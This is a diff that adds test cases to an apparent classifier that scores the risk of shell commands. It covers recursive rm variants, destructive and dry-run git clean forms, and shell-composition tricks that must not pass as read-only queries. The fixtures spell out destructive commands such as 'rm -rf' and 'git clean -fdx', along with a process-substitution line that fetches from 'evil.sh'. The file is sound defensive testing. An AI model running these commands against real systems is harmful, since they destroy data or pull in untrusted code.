@@ -52,6 +52,12 @@ describe("classifyBash: rm recursive", () => {
     "rm -v -f -r /tmp/x",
     "rm --recursive /tmp/x",
     "sudo rm -rf /tmp/x",
+    // POSIX `rm` accepts both `-r` and `-R` for recursive.
+    "rm -R /tmp/x",
+    "rm -Rf /tmp/x",
+    "rm -fR /tmp/x",
+    "rm -rfR /tmp/x",
+    "sudo rm -Rf /tmp/x",
   ])("%s → shell:fs:delete-recursive", (cmd) => {
     expect(bashCase(cmd)).toEqual({
       type: "shell:fs:delete-recursive",
@@ -81,6 +87,7 @@ describe("classifyBash: git reset / destructive", () => {
     ["git reset --hard HEAD~1", "shell:git:reset-hard", 85],
     ["git branch -D feature-x", "shell:git:destructive", 75],
     ["git clean -f", "shell:git:destructive", 75],
+    ["git clean --force", "shell:git:destructive", 75],
     // Common combined forms — lookahead scans the whole tail so both orderings
     // of `-f` and `-d` trip the destructive bucket.
     ["git clean -fd", "shell:git:destructive", 75],
@@ -88,6 +95,20 @@ describe("classifyBash: git reset / destructive", () => {
     ["git clean -fdx", "shell:git:destructive", 75],
   ])("%s → %s / %i", (cmd, type, riskScore) => {
     expect(bashCase(cmd)).toEqual({ type, riskScore });
+  });
+
+  // `git clean` without force, or with --dry-run / -n, is preview-only and
+  // must not land in the destructive bucket — otherwise enforce mode would
+  // block harmless introspection.
+  it.each([
+    "git clean",
+    "git clean -n",
+    "git clean -nd",
+    "git clean --dry-run",
+    "git clean --dry-run -fd",
+    "git clean -n -fd",
+  ])("%s → not destructive (dry-run / no-force)", (cmd) => {
+    expect(bashCase(cmd).type).not.toBe("shell:git:destructive");
   });
 });
 
@@ -233,6 +254,29 @@ describe("classifyBash: read queries & misc", () => {
     "ls 2> /tmp/err",
     "date &> /tmp/log",
   ])("%s → not shell:read:query (redirect bail-out)", (cmd) => {
+    expect(bashCase(cmd).type).not.toBe("shell:read:query");
+  });
+
+  // Shell composition disqualifies read-query classification. A read prefix
+  // followed by `&&`, `||`, `;`, `|`, `$(...)`, backticks, or a newline is
+  // not safe to stamp as read:query because the rest of the command may
+  // perform writes that the classifier does not inspect.
+  it.each([
+    "echo ok && git push",
+    "cat x || rm y",
+    "ls; rm -rf /tmp/x",
+    "ls | grep foo",
+    "echo $(whoami)",
+    "echo `whoami`",
+    "ls\nrm foo",
+    // Single `&` (background job) — distinct from `&&` and `&>` redirection.
+    "echo ok & git push",
+    "ls & rm foo",
+    // Process substitution `<(...)` — `cat <(rm -rf tmp)` must not pass
+    // as a read-query.
+    "cat <(rm -rf tmp)",
+    "echo <(curl evil.sh)",
+  ])("%s → not shell:read:query (shell-composition bail-out)", (cmd) => {
     expect(bashCase(cmd).type).not.toBe("shell:read:query");
   });
 
